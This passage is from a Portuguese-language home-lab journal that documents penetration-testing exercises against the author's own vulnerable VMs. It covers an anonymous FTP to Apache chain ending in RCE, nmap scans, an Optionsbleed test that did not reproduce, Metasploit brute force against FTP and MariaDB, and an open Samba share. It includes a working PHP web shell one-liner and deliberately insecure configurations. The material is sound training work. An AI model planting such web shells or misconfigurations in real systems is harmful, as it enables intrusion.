4. Primeira tentativa de acesso (`curl http://192.168.10.101:8080/teste.txt`) devolveu `403 Forbidden` — causa: a regra global do Apache (`apache2.conf`) nega acesso, por defeito, a qualquer pasta fora de `/var/www/`. Corrigido adicionando um bloco `<Directory /srv/ftp/upload> Require all granted </Directory>` no site.
5. Segunda tentativa ainda falhou, mas com um erro diferente no log (`file permissions deny server access`) — o ficheiro `teste.txt`, criado antes por upload anónimo, tinha permissões `600` (só o dono `ftp` podia ler), impedindo o utilizador `www-data` do Apache de o servir. Diagnosticado com `namei -l`, que mostrou a cadeia de permissões completa até ao ficheiro.
6. Identificada a causa: o `vsftpd` aplica um `umask` restritivo (`077`) por defeito aos uploads anónimos, precisamente para dificultar este tipo de cadeia. Adicionada uma segunda má configuração deliberada — `anon_umask=022` em `/etc/vsftpd.conf` — e reiniciado o serviço.
7. Confirmado com um novo upload (`teste2.txt`) que as permissões passaram a `644` (`rw-r--r--`), legíveis por todos. `curl http://192.168.10.101:8080/teste2.txt` devolveu o conteúdo do ficheiro com sucesso.
8. Criado um mini web shell (`<?php echo shell_exec($_GET["cmd"]); ?>`), enviado por FTP anónimo como `shell.php`, e acedido via `curl "http://192.168.10.101:8080/shell.php?cmd=whoami"` — resposta: `www-data`, confirmando execução de comandos arbitrários no servidor.

### Resultado
Cadeia de ataque completa e confirmada: um atacante sem qualquer credencial consegue, a partir de fora, escrever um ficheiro PHP no servidor via FTP anónimo e executar código arbitrário nele através de um pedido HTTP normal, obtendo execução de comandos com o utilizador `www-data`.

### Deduções e raciocínio
Esta entrada tem um valor didático que nenhuma das vulnerabilidades isoladas tinha sozinha: nenhuma das duas más configurações — escrita anónima por FTP, ou um Apache a servir uma pasta partilhada — é, por si só, suficiente para o ataque funcionar por completo (o `vsftpd` protege os uploads anónimos com um `umask` restritivo por defeito, o que só de si já travaria a cadeia). Foi preciso empilhar deliberadamente **duas** más configurações distintas para chegar ao RCE: acesso de escrita anónimo + `umask` relaxado nos uploads. Isto espelha como falhas de segurança reais raramente vêm de um único erro óbvio — são mais frequentemente combinações de pequenas decisões de configuração, cada uma aparentemente inofensiva isoladamente, que juntas abrem uma cadeia de exploração completa. A escolha de não usar o DVWA (por estar isolado num container Docker sem pasta partilhada) também reforçou uma lição sobre isolamento de containers: mesmo o próprio administrador do sistema tem dificuldade em alcançar diretamente o sistema de ficheiros interno de um container sem uma montagem de volume explícita.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "consegui enviar um ficheiro PHP através de um login anónimo no FTP, e depois, só por pedir esse ficheiro através do browser (ou `curl`), o servidor executou o código PHP dentro dele — isso deu-me a capacidade de correr qualquer comando no servidor, tudo isto sem nunca ter tido uma password."

### Como nos podemos defender
Múltiplas camadas de defesa quebrariam esta cadeia em qualquer ponto: (1) nunca ativar escrita anónima em FTP; (2) mesmo quando é necessária, nunca fazer coincidir a pasta de destino do FTP com uma pasta servida pela web; (3) desativar a execução de PHP (ou qualquer linguagem de servidor) em pastas de upload, através de diretivas como `php_admin_flag engine off` num bloco `<Directory>` dedicado, ou restringindo por extensão; (4) aplicar o princípio do menor privilégio nas permissões de ficheiros — mesmo que a pasta seja de escrita livre, os ficheiros não precisam de ser legíveis por todos os utilizadores do sistema. Esta é a mesma lição de defesa em profundidade já vista nos módulos File Upload do DVWA (Entradas #37–#39), agora aplicada a uma cadeia entre dois serviços de sistema em vez de dentro de uma única aplicação web.

### Gravidade e impacto real (num cenário empresarial) — síntese para a cadeia FTP anónimo → RCE via Apache (Entradas #59-60)

Serviços antigos ou esquecidos (um servidor FTP que já ninguém se lembra que ainda está ligado) são um ponto de entrada clássico em incidentes reais, precisamente por já não fazerem parte do "mapa mental" de ninguém sobre a própria superfície de ataque — deixam de ser corrigidos, monitorizados ou revistos. Numa pequena/média empresa, este tipo de serviço é muitas vezes literalmente esquecido — montado uma vez por um contratante de TI que já não trabalha lá, ou parte de um fluxo de backup antigo nunca revisto — e a descoberta só costuma acontecer depois de uma violação já ter ocorrido. Numa empresa grande, existem ferramentas de inventário de ativos e gestão de superfície de ataque precisamente para apanhar este tipo de situação à escala — mas o número elevado de sistemas (incluindo TI paralela e servidores de desenvolvimento/teste esquecidos) significa que alguns escapam sempre; é um padrão de violação real recorrente (à semelhança de casos históricos como o da Equifax: um componente antigo, mal configurado ou por corrigir, que ninguém estava a monitorizar).

### Domínios relacionados
Security+ D2/D4 (Arquitetura e Operações — hardening de serviços, defesa em profundidade), CEH D4 (Enumeração de serviços), CEH D5 (Análise de vulnerabilidades), A+ Core 2 D2 (Segurança).

### Próximos passos
Avançar para a enumeração formal com `nmap` a partir do Kali, cobrindo todos os serviços agora expostos nesta VM (FTP, HTTP na 8080, e os que já existiam do DVWA na 80), como exercício de reconhecimento antes de qualquer exploração adicional via Metasploit.

---

## Entrada #61 — Enumeração formal com nmap do Servidor Vulnerável
**Data/hora:** 2026-08-22
**Máquinas ligadas:** Servidor Vulnerável, Kali

### Objetivo / Propósito
Fazer um levantamento formal e completo dos serviços expostos no Servidor Vulnerável, como se fosse o primeiro contacto com a máquina (fase de reconhecimento), sem assumir à partida o que já sabemos ter configurado nós próprios.

### Ação executada
Executado, a partir do Kali:
```
nmap -sV -p- 192.168.10.101
```
(`-sV` deteta versão dos serviços; `-p-` varre as 65535 portas TCP, para não deixar nada por descobrir por causa de um scan rápido só às portas mais comuns).

### Resultado
Quatro portas abertas, todas identificadas corretamente:
- `21/tcp` — `vsftpd 3.0.5` (o FTP mal configurado da Entrada #59)
- `22/tcp` — `OpenSSH 9.6p1 Ubuntu 3ubuntu13.18`
- `80/tcp` — `Apache httpd 2.4.25 ((Debian))` (o container do DVWA)
- `8080/tcp` — `Apache httpd 2.4.58` (o Apache novo da Entrada #60, apontado para a pasta do FTP)

O `nmap` também identificou o sistema operativo como Linux/Unix e reportou o hostname interno `127.0.1.1` a partir do banner do Apache.

### Deduções e raciocínio
Este scan confirma, de fora e sem qualquer conhecimento prévio, exatamente os quatro serviços que fomos configurando ao longo da sessão — o que é uma boa validação de que a enumeração funciona como esperado antes de avançarmos para exploração ativa. Há um detalhe interessante: o banner do Apache na porta 80 identifica-se como `2.4.25 ((Debian))`, uma versão mais antiga que a do Apache novo na 8080 (`2.4.58`, sem indicação de distribuição) — isto é uma pista visível de que estes dois serviços não correm no mesmo ambiente de base (o `80` está dentro do container Docker do DVWA, com a sua própria imagem Debian mais antiga; o `8080` corre diretamente no Ubuntu 24.04 da VM). Um atacante real, só com este scan, já teria informação suficiente para procurar exploits específicos de cada versão reportada (por exemplo, via `searchsploit` ou bases de dados como o Exploit-DB) — o que é exatamente o próximo passo lógico do processo de reconhecimento.

Vale a pena notar que este `nmap` não escondeu nada nem foi bloqueado por nenhuma firewall (nem no lado do Servidor Vulnerável, nem no OPNsense) — todas as portas reais aparecem, o que é esperado num ambiente de laboratório sem hardening propositado. Em produção, ferramentas de deteção de scans agressivos (IDS/IPS) e regras de firewall mais restritivas tipicamente limitariam ou alertariam sobre um scan destes.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "corri uma varredura de todas as portas TCP contra o servidor, e sem saber nada de antemão, o nmap revelou-me automaticamente os quatro serviços que lá estavam a correr, com as versões exatas de cada um — informação suficiente para começar a procurar vulnerabilidades específicas de cada versão."

### Como nos podemos defender
Reduzir a superfície de ataque visível: fechar/filtrar portas não necessárias externamente (uma firewall de host, como o `ufw`, ou regras no gateway), desativar banners detalhados de versão sempre que possível (`ServerTokens Prod` no Apache, por exemplo, para não anunciar a versão exata), e usar deteção de scans agressivos (IDS/IPS) como sinal de alerta precoce de reconhecimento hostil.

### Domínios relacionados
CEH D3/D4 (Reconhecimento e Enumeração), Security+ D4 (Operações de Segurança — deteção e monitorização), A+ Core 2 D2 (Segurança de rede).

### Próximos passos
Usar as versões identificadas para procurar vulnerabilidades conhecidas (por exemplo, `searchsploit apache 2.4.25` ou `searchsploit vsftpd`), e avançar depois para a exploração formal com o Metasploit Framework.

---

## Entrada #62 — Investigação do Optionsbleed (CVE-2017-9798) no Apache do DVWA: bug relacionado confirmado, vulnerabilidade principal não reproduzida
**Data/hora:** 2026-08-22
**Máquinas ligadas:** Servidor Vulnerável, Kali

### Objetivo / Propósito
A partir do resultado do `nmap` (Entrada #61), investigar se o Apache antigo (`2.4.25`) dentro do container do DVWA era vulnerável ao Optionsbleed (CVE-2017-9798) — uma vulnerabilidade real de divulgação de memória, ao contrário das más configurações anteriores (que fomos nós a criar de propósito).

### Ação executada
1. Localizado o exploit/PoC com `searchsploit apache 2.4.25` e `searchsploit vsftpd` — nenhum exploit correspondia exatamente à versão do `vsftpd` instalado (`3.0.5`), mas o Apache `2.4.25` caía no intervalo afetado pelo Optionsbleed (`< 2.4.27`).
2. Copiado o script de PoC (`searchsploit -m linux/webapps/42745.py`) e revisto o código antes de correr, por boa prática.
3. Primeira tentativa (`-u http://192.168.10.101/`) não devolveu qualquer output — diagnosticado no próprio código do script um detalhe de lógica: o modo `-u` só faz **um único pedido**, ignorando o parâmetro `-n` (repetições). Esse único pedido caiu num `302 Found` (redirecionamento para `login.php`, comportamento normal do DVWA), que não tem cabeçalho `Allow`.
4. Testado manualmente com `curl -X OPTIONS` contra `/` e `/login.php` — ambos processados pelo PHP (que não distingue métodos HTTP), sem gerar cabeçalho `Allow` nunca, porque o pedido nunca chega à parte do Apache que o geraria.
5. Testado contra um recurso estático não processado por PHP (`/dvwa/css/login.css`) — aí sim apareceu um cabeçalho `Allow: OPTIONS,HEAD,HEAD,GET,HEAD,POST`, com `HEAD` repetido três vezes (anomalia).
6. Repetido o mesmo pedido 20 vezes em sequência — resultado sempre idêntico, byte a byte.
7. Repetido o mesmo pedido 50 vezes **em simultâneo** (concorrência real, via `&`/`wait` em `bash`), para dar a oportunidade certa à condição de corrida que causa o Optionsbleed — resultado: as 50 respostas continuaram todas com exatamente o mesmo valor, sem qualquer variação ou corrupção.

### Resultado
Confirmado um bug relacionado mas distinto (duplicação determinística de métodos no cabeçalho `Allow`, associado ao Apache bug #61207) — sem impacto de segurança por si só. A vulnerabilidade principal investigada (Optionsbleed, divulgação de memória via condição de corrida) **não foi reproduzida** neste ambiente, mesmo sob concorrência real.

### Deduções e raciocínio
O Optionsbleed depende de uma condição muito específica: normalmente, ficheiros `.htaccess` com diretivas `Limit`/`LimitExcept` contraditórias entre vários blocos de configuração, que desencadeiam uma libertação de memória prematura (*use-after-free*) sob concorrência. A imagem Docker do DVWA usada aqui, apesar de correr uma versão de Apache no intervalo tecnicamente afetado, não parece ter essa configuração específica presente — daí o cabeçalho ser sempre consistente, mesmo sob 50 pedidos simultâneos. Isto é uma boa lição sobre a diferença entre "a versão de software é vulnerável" e "a vulnerabilidade é explorável nesta instalação em concreto": ter o número de versão certo é uma condição necessária, mas não suficiente — a configuração real também tem de reunir as condições precisas para o bug se manifestar. Vale a pena documentar isto como um resultado negativo honesto, em vez de forçar uma conclusão de sucesso que os dados não suportam.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "tentei explorar uma vulnerabilidade conhecida de fuga de memória numa versão antiga do Apache; encontrei um sintoma parecido, mas relacionado com um bug diferente e sem gravidade, e mesmo bombardeando o servidor com pedidos simultâneos não consegui provocar a fuga de memória real — o que me ensinou que ter a versão de software vulnerável não significa automaticamente que o ataque específico funcione."

### Como nos podemos defender
Manter software atualizado continua a ser a defesa primária (versões posteriores ao `2.4.27` corrigem este bug na origem). Para além disso, este caso reforça o valor de testes de penetração reais sobre simples correspondência de versões (*version matching*) — scanners automáticos que só comparam números de versão podem sinalizar falsos positivos de risco que não se confirmam na prática, e o inverso também é possível.

### Gravidade e impacto real (num cenário empresarial) — nota sobre a investigação do Optionsbleed (Entrada #62), sem falha encontrada

Precisamente por não ter sido encontrada nenhuma vulnerabilidade real, o valor desta entrada está noutro sítio: demonstra que uma versão de software dentro do intervalo afetado por uma CVE não significa automaticamente que o sistema seja explorável na prática (o gatilho depende de configuração específica, pode haver correções aplicadas sem mudança de número de versão, etc.). Reagir com pânico a cada correspondência de versão de um scanner, sem confirmar explorabilidade real, desperdiça tempo de segurança escasso que podia ir para riscos genuínos. Tanto numa pequena/média empresa como numa grande, isto é um lembrete de que scanners de vulnerabilidades produzem falsos positivos que precisam de triagem — mas empresas grandes costumam ter pessoal dedicado para essa triagem, enquanto pequenas empresas tendem ou a reagir em excesso (gastando tempo limitado sem necessidade) ou, pior, a ficar insensibilizadas e a ignorar por completo o que o scanner reporta ("fadiga de alertas").

### Domínios relacionados
CEH D5 (Análise de vulnerabilidades — diferença entre vulnerabilidade teórica e exploração prática), Security+ D4 (Operações — gestão de patches), A+ Core 2 D2 (Segurança).

### Próximos passos
Encerrar esta investigação lateral e avançar para o exercício planeado com o Metasploit Framework: um módulo de ataque de credenciais (`ftp_login` ou `ssh_login`) contra os serviços configurados nesta VM.

---

## Entrada #63 — Ataque de força bruta a credenciais FTP com o Metasploit Framework (auxiliary/scanner/ftp/ftp_login)
**Data/hora:** 2026-08-22
**Máquinas ligadas:** Servidor Vulnerável, Kali

### Objetivo / Propósito
Fechar a Fase 4 com o exercício originalmente planeado: usar o Metasploit Framework para um ataque formal de força bruta a credenciais, desta vez contra um utilizador de sistema real (autenticado, não anónimo) no serviço FTP.

### Ação executada
1. Criado no Servidor Vulnerável um utilizador de teste dedicado a este exercício, `testftp`, com uma password propositadamente fraca (`123456`) — em vez de tentar adivinhar a password real do utilizador `pedro`, o que seria arriscado e desnecessário.
2. Preparadas, no Kali, duas listas pequenas: `users.txt` (com `testftp` escondido entre outros nomes plausíveis — `admin`, `pedro`, `root`) e `passwords.txt` (com `123456` escondida entre outras passwords comuns — `password`, `admin123`, `letmein`, `qwerty`).
3. Aberto o `msfconsole` e selecionado o módulo `auxiliary/scanner/ftp/ftp_login`.
4. Configurados os parâmetros: `RHOSTS 192.168.10.101`, `USER_FILE`/`PASS_FILE` com as listas criadas, `STOP_ON_SUCCESS true` (para parar assim que encontrasse uma combinação válida, em vez de continuar a testar sem necessidade).
5. Executado com `run` — o módulo tentou várias combinações (`admin:password`, `admin:123456`, `admin:admin123`, `admin:letmein`, `admin:qwerty`, `testftp:password`), todas falhadas, até encontrar `testftp:123456` com sucesso na 7ª tentativa.

### Resultado
Credencial válida descoberta por força bruta automatizada: `testftp` / `123456`. O Metasploit confirmou o login com `[+] Login Successful`.

### Deduções e raciocínio
Este exercício fecha o ciclo formal da Fase 4 com a ferramenta que o roteiro sempre previu (Metasploit Framework), depois de termos já explorado más configurações manuais (Entradas #59–#60) e uma vulnerabilidade de versão que não se confirmou na prática (Entrada #62). A diferença central deste ataque, em relação aos anteriores, é que aqui não há nenhuma "falha de configuração" a explorar — a única fraqueza é a escolha de uma password fraca e previsível por parte do utilizador. É um lembrete de que muitas invasões reais não dependem de exploits sofisticados de software, mas simplesmente de credenciais fracas ou reutilizadas, encontradas por ferramentas de força bruta simples e automatizadas como esta.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "usei o Metasploit para testar várias combinações de utilizador e password contra o servidor FTP, com listas pequenas mas realistas, e a ferramenta encontrou sozinha a combinação certa numa das primeiras tentativas — isto mostra como passwords fracas e previsíveis são muitas vezes o elo mais fraco de um sistema, mais do que falhas de software."

### Como nos podemos defender
Políticas de password fortes e obrigatórias (comprimento mínimo, complexidade), bloqueio de conta após um número limitado de tentativas falhadas (proteção contra força bruta), autenticação multifator sempre que possível, e monitorização/alerta de múltiplas tentativas de login falhadas num curto espaço de tempo (deteção de força bruta ativa).

### Domínios relacionados
CEH D6 (Ataques ao Sistema — força bruta, quebra de passwords), Security+ D2/D4 (Arquitetura e Operações — políticas de autenticação), A+ Core 2 D2 (Segurança).

### Próximos passos
**Fase 4 encerrada por hoje**, com três resultados concretos: (1) cadeia de ataque FTP anónimo → RCE via Apache (Entradas #59–#60), (2) investigação honesta de uma vulnerabilidade de versão sem confirmação prática (Entrada #62), e (3) força bruta de credenciais bem-sucedida com Metasploit (esta entrada). Continuar a Fase 4 numa próxima sessão (mais serviços a enumerar/explorar), ou avançar para a Fase 5 (Windows Server, hardening, deteção — Wazuh), conforme prioridade a decidir.

---

## Entrada #64 — Samba com partilha anónima mal configurada, enumeração e upload confirmados a partir do Kali
**Data/hora:** 2026-08-23
**Máquinas ligadas:** Servidor Vulnerável, Kali

### Objetivo / Propósito
Repetir, noutro protocolo, o mesmo tipo de exercício já feito com o FTP (Entrada #59): configurar deliberadamente um serviço de partilha de ficheiros (Samba) com acesso anónimo mal protegido, e confirmar a partir do Kali que é possível enumerar e escrever na partilha sem qualquer credencial.

### Ação executada
1. Instalado o `samba` via `apt`. O `apt` avisou sobre uma atualização de kernel pendente (`6.8.0-138-generic`), sem relação com o exercício — não tratado nesta entrada.
2. Criada a pasta `/srv/samba/publico` com permissões `777`.
3. Adicionado ao `/etc/samba/smb.conf` um novo bloco de partilha:
   ```
   [publico]
      path = /srv/samba/publico
      browseable = yes
      read only = no
      guest ok = yes
      guest only = yes
   ```
   (`guest ok = yes` permite acesso sem autenticação; `guest only = yes` força esse acesso anónimo mesmo que sejam fornecidas credenciais; `read only = no` permite escrita.)
4. Reiniciado o serviço (`sudo systemctl restart smbd`) — arrancou sem erros (só um aviso inofensivo do `systemd` sobre uma variável de ambiente `SMBDOPTIONS` não definida, sem impacto funcional).
5. A partir do Kali, confirmado com `nmap -p 139,445 -sV 192.168.10.101` que o Samba estava exposto nas duas portas clássicas do protocolo (139 — NetBIOS Session Service; 445 — SMB direto sobre TCP/IP).
6. Listadas as partilhas disponíveis sem qualquer credencial: `smbclient -L //192.168.10.101/ -N` — revelou a partilha `publico`, para além das partilhas administrativas padrão (`print$`, `IPC$`).
7. Ligado à partilha (`smbclient //192.168.10.101/publico -N`) e testada escrita: `put testesamba.txt`, seguido de `ls` — ficheiro confirmado na partilha remota (`20` bytes, atributo `A`).
8. **Nota de processo:** a primeira tentativa (colando várias linhas de comando de uma vez no prompt do `smbclient`) falhou de forma instrutiva — o `smbclient` engoliu as três linhas como um único comando local (`!`), fazendo com que `put` fosse interpretado pelo shell do Kali (que não o reconhece, `sh: 2: put: not found`) e o `ls` seguinte listasse a pasta pessoal do Kali em vez da partilha remota. Corrigido repetindo os comandos um de cada vez, com o prompt `smb: \>` a confirmar entre cada um.

### Resultado
Partilha Samba anónima e de escrita livre confirmada e funcional — o mesmo tipo de falha já visto no FTP (Entrada #59), agora replicado noutro protocolo largamente usado em redes empresariais.

### Deduções e raciocínio
Este exercício reforça uma lição importante: o padrão "acesso anónimo mal pensado" não é uma característica de um serviço específico — é um erro de configuração que se repete, com a mesma forma, em protocolos completamente diferentes (FTP, agora Samba, e potencialmente bases de dados a seguir). Reconhecer o padrão em vez de memorizar sintomas de um único serviço é o que realmente transfere para avaliar sistemas novos e desconhecidos no futuro. O incidente de processo (colar várias linhas no `smbclient`) também tem valor didático próprio: é um lembrete de que ferramentas interativas de linha de comandos (REPLs) nem sempre lidam bem com múltiplas linhas coladas de uma vez, e o comando `!` (execução local) pode "engolir" mais do que se pretende se não se validar o prompt entre comandos — uma disciplina útil para qualquer ferramenta interativa, não só o `smbclient`.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "configurei uma partilha de rede Samba para aceitar ligações anónimas com permissão de escrita, e a partir de outra máquina consegui listar essa partilha e enviar um ficheiro para lá, tudo sem fornecer qualquer utilizador ou password — o mesmo tipo de erro que já tinha visto no FTP, mas noutro protocolo."

### Como nos podemos defender
Nunca ativar `guest ok = yes` em partilhas Samba que não sejam mesmo destinadas a acesso público irrestrito; quando o acesso anónimo for mesmo necessário, restringir sempre a escrita (`read only = yes`); segmentar e limitar o acesso de rede às portas SMB (139/445) só a hosts que precisem mesmo de aceder à partilha; e auditar periodicamente a configuração de partilhas de rede, já que este tipo de erro tende a acontecer por conveniência temporária que depois nunca é revertida.

### Gravidade e impacto real (num cenário empresarial) — síntese para a partilha Samba anónima (Entrada #64)

Uma partilha de rede escrevível anonimamente é um ponto de apoio para mais do que roubo de dados — um atacante (ou, historicamente, vermes auto-propagantes como o WannaCry/NotPetya) pode colocar ali ficheiros maliciosos que serão executados por quem os abrir mais tarde, ou usar a partilha como área de preparação para implantar ransomware por toda a rede. Numa pequena/média empresa, as unidades partilhadas são muitas vezes a verdadeira espinha dorsal do trabalho diário (documentos partilhados, faturas), pelo que uma partilha comprometida não é "só um servidor de ficheiros" — é todos os ficheiros de trabalho da empresa, com exposição direta a ransomware e paragem das operações diárias. Numa empresa grande, as partilhas costumam estar mais segmentadas por departamento/grupo de permissões, limitando o raio de impacto de uma única partilha mal configurada — mas os incidentes históricos de vermes (o WannaCry atingiu operações multinacionais de grande dimensão, incluindo hospitais) mostram que mesmo uma única partilha mal exposta, numa rede grande e pouco segmentada, pode escalar de forma catastrófica.

### Domínios relacionados
Security+ D2/D4 (Arquitetura e Operações — configuração segura de serviços de partilha de ficheiros), CEH D4 (Enumeração de serviços SMB), A+ Core 2 D2 (Segurança de rede).

### Próximos passos
Continuar a Fase 4 com o último serviço em falta do roteiro (uma base de dados com credenciais fracas), ou avançar para a Fase 5, conforme prioridade a decidir.

---

## Entrada #65 — Base de dados MariaDB exposta com credenciais fracas, confirmada manualmente e via Metasploit
**Data/hora:** 2026-08-23
**Máquinas ligadas:** Servidor Vulnerável, Kali

### Objetivo / Propósito
Fechar o terceiro e último serviço previsto no roteiro da Fase 4 ("FTP, Samba, bases de dados"): configurar uma base de dados com acesso remoto e credenciais fracas, um erro clássico de bases de dados deixadas "só para testes" e nunca corrigidas.

### Ação executada
1. Instalado o `mariadb-server` via `apt` (em vez do `mysql-server` da Oracle) — decisão documentada por três motivos: o repositório oficial do Ubuntu 24.04 já não distribui o MySQL diretamente, exigindo um repositório extra; o MariaDB é um substituto direto (*drop-in replacement*) do MySQL, com a mesma linguagem SQL e as mesmas ferramentas de administração e ataque (incluindo os módulos do Metasploit); e é o que se encontra hoje em dia na maioria dos servidores Linux reais.
2. Confirmado que a configuração por defeito só aceitava ligações locais (`bind-address = 127.0.0.1`, em `/etc/mysql/mariadb.conf.d/50-server.cnf`).
3. Alterado para `bind-address = 0.0.0.0` (aceita ligações de qualquer origem) via `sed`, e reiniciado o serviço.
4. Criado um utilizador de teste com password fraca e acesso total, de qualquer origem: `CREATE USER 'dbadmin'@'%' IDENTIFIED BY 'admin123'; GRANT ALL PRIVILEGES ON *.* TO 'dbadmin'@'%';`.
5. Confirmado com `ss -tlnp` que o MariaDB estava mesmo a escutar em `0.0.0.0:3306`.
6. Primeira tentativa de ligação a partir do Kali (`mysql -h 192.168.10.101 -u dbadmin -padmin123`) falhou com `ERROR 2026: TLS/SSL error: SSL is required, but the server does not support it` — diagnosticado: o cliente `mysql` moderno exige TLS por defeito ao ligar a um host remoto, mas o servidor nunca teve TLS configurado (mais uma falha real desta configuração: dados e credenciais a viajarem sem cifra). Contornado com a flag `--skip-ssl`, replicando o que um atacante real faria.
7. Ligação bem-sucedida confirmada manualmente — `SHOW DATABASES;` devolveu a lista completa sem qualquer restrição.
8. Formalizado com Metasploit (`auxiliary/scanner/mysql/mysql_login`): uma primeira tentativa com listas completas de utilizadores/passwords revelou um problema da própria ferramenta — o módulo nunca chegou a testar `dbadmin` (ficou preso a testar `root` e `admin`, com vários "Unhandled error" causados por uma incompatibilidade da biblioteca Ruby do Metasploit com o protocolo de autenticação desta versão do MariaDB). Corrigido testando diretamente com `USERNAME dbadmin` e `PASSWORD admin123` — sucesso confirmado (`Success: 'dbadmin:admin123'`).

### Resultado
Base de dados MariaDB exposta remotamente, com credenciais fracas e sem cifra de ligação, confirmada como explorável tanto manualmente como via Metasploit.

### Deduções e raciocínio
Este exercício fecha o padrão que já se repetiu nos três serviços da Fase 4: o erro central nunca foi uma vulnerabilidade de código (como o Optionsbleed, que nem sequer se confirmou na prática), mas sim decisões de configuração — acesso anónimo, credenciais fracas, ausência de cifra — replicadas em protocolos completamente diferentes (FTP, Samba, agora SQL). O obstáculo do TLS foi uma boa lição extra: mostra como as ferramentas de cliente modernas às vezes já assumem segurança por defeito (exigir TLS), mas isso só protege quem usa essa ferramenta com essa exigência ativa — um servidor mal configurado, ou um atacante disposto a desativar essa proteção do seu próprio lado (`--skip-ssl`), continuam vulneráveis da mesma forma. Segurança do lado do cliente não compensa a falta de segurança do lado do servidor. O problema do Metasploit a "perder" utilizadores da lista também reforça uma lição já vista no Optionsbleed: as ferramentas de segurança têm os seus próprios bugs e limitações, e um resultado negativo ou incompleto de uma ferramenta não prova, por si só, que o alvo está seguro — só prova que aquela tentativa específica falhou.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "configurei uma base de dados para aceitar ligações de fora com um utilizador de password fraca, e depois de contornar uma exigência de cifra do lado do meu próprio cliente, consegui ligar-me e ver todas as bases de dados do servidor, sem qualquer autorização legítima — confirmei isto manualmente e depois com uma ferramenta formal de ataque, que teve as suas próprias limitações pelo caminho."

### Como nos podemos defender
Nunca expor uma base de dados diretamente à rede sem necessidade real (`bind-address = 127.0.0.1` deve ser o padrão, a menos que haja uma razão explícita para mudar); quando o acesso remoto for mesmo necessário, restringir por IP de origem específico em vez de `%` (qualquer origem), aplicar políticas de password fortes, e ativar TLS/SSL no próprio servidor para cifrar a ligação — não confiar só na exigência do lado do cliente. Firewalls de rede (segmentação, `ufw`) devem também limitar quem consegue sequer chegar à porta `3306`.

### Gravidade e impacto real (num cenário empresarial) — síntese para credenciais fracas via Metasploit, FTP (Entrada #63) e MariaDB (Entrada #65)

Credenciais fracas ou por defeito em serviços de infraestrutura (bases de dados, FTP, painéis de administração) continuam a ser uma das causas-raiz mais comuns de violações reais — mais comuns na prática do que exploits sofisticados, porque não exigem nenhuma vulnerabilidade de software, só uma política de passwords não aplicada. O caso do MariaDB acrescenta uma segunda exposição, distinta: mesmo uma password forte não ajuda se a própria ligação não for cifrada, porque credenciais e resultados de consultas viajam em texto simples pela rede, intercetáveis por qualquer um no mesmo segmento. Numa pequena/média empresa, bases de dados são frequentemente administradas por quem estiver disponível (não um DBA dedicado), credenciais por defeito ou reutilizadas são comuns, e não há monitorização de rede para apanhar logins anómalos. Numa empresa grande, a gestão de credenciais/segredos costuma ser mais madura (rotação, cofres dedicados), mas o número de sistemas e administradores multiplica a probabilidade de pelo menos uma credencial antiga esquecida continuar fraca — e frameworks regulatórios (como o PCI-DSS, para bases de dados com dados de pagamento) exigem especificamente cifra em trânsito, tornando uma ligação a bases de dados sem cifra uma falha de conformidade com consequências financeiras e de auditoria diretas, não só técnicas.

### Domínios relacionados
Security+ D2/D4 (Arquitetura e Operações — configuração segura de bases de dados, cifra em trânsito), CEH D4 (Enumeração de serviços de bases de dados), A+ Core 2 D2 (Segurança de rede).

### Próximos passos
**Fase 4 encerra aqui os três serviços previstos no roteiro** (FTP, Samba, base de dados), com um total de sete entradas produzidas nesta fase (#57–#65, contando a recuperação da VM e a descoberta da arquitetura de rede). Avançar para a Fase 5 (Windows Server, hardening, deteção — Wazuh) numa próxima sessão, ou continuar a aprofundar a Fase 4 com mais cenários, conforme prioridade a decidir.

---

## Entrada #66 — Início da Fase 5: recuperação de acesso e correção de rede do Windows Server
**Data/hora:** 2026-08-24
**Máquinas ligadas:** Windows Server, OPNsense

### Objetivo / Propósito
Arrancar a Fase 5 do roteiro (Active Directory, hardening, deteção com Wazuh), começando por confirmar que a VM Windows Server — sem uso há bastante tempo — estava acessível e corretamente ligada à rede do lab.

### Ação executada
1. Login inicial falhou por password incorreta — diagnosticado como um erro de maiúscula/minúscula na password guardada (não um esquecimento real da password). Resolvido corrigindo a capitalização ao escrever.
2. Confirmado com `ipconfig` que a VM tinha um IP da rede de casa (`192.168.1.240`), não da rede isolada do lab (`192.168.10.0/24`), com uma tabela de rotas confusa (`Get-NetIPConfiguration` mostrou três gateways por defeito diferentes acumulados: `192.168.1.241`, `192.168.1.1`, `192.168.10.254`) e DNS a apontar para o router de casa.
3. Verificado nas definições do VMware Workstation que o adaptador de rede já estava corretamente ligado ao LAN Segment "Ciber" (igual às outras VMs) — o problema não era de virtualização, era uma configuração de IP estática antiga dentro do próprio Windows, nunca limpa.
4. Removida a configuração antiga (`Remove-NetIPAddress`, `Remove-NetRoute`) e atribuído um IP fixo dentro da rede do lab: `192.168.10.10/24`, gateway `192.168.10.254`, DNS `192.168.10.254` (temporário — vai passar a ser o próprio Windows Server, quando o Active Directory estiver instalado). Escolhido IP fixo (não DHCP) por ser o Controlador de Domínio previsto — precisa de um endereço estável para os clientes o encontrarem.
5. Confirmado o resultado final com `ping 192.168.10.254` — sucesso, 0% de perda.

### Resultado
Windows Server acessível e corretamente ligado à rede isolada do lab, com IP fixo `192.168.10.10`, pronto para a instalação do Active Directory.

### Deduções e raciocínio
Este é já o terceiro caso, ao longo do projeto, de uma VM com configuração de rede desatualizada de uma utilização anterior a causar confusão (o Kali a cair na rede errada, o Ubuntu Desktop com uma reserva DHCP escondida, e agora o Windows Server com um IP estático de outra rede). O padrão comum: sempre que uma VM fica muito tempo sem uso, vale a pena verificar a configuração de rede do zero antes de assumir que "deve estar bem", em vez de gastar tempo a diagnosticar sintomas indiretos.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "a VM tinha ficado com um endereço IP de uma rede antiga (de casa), com resíduos de configurações manuais várias, por isso limpei tudo e atribuí um IP fixo novo dentro da rede do laboratório."

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo — é gestão de infraestrutura. Lição transferível: documentar sempre a configuração de rede esperada de cada máquina (como já faz o roteiro) permite detetar rapidamente desvios, em vez de reconstruir o raciocínio do zero cada vez.

### Domínios relacionados
A+ Core 1 D2 (Redes — configuração de IP, gateway, DNS), Security+ D3 (Arquitetura de Segurança — gestão de configuração).

### Próximos passos
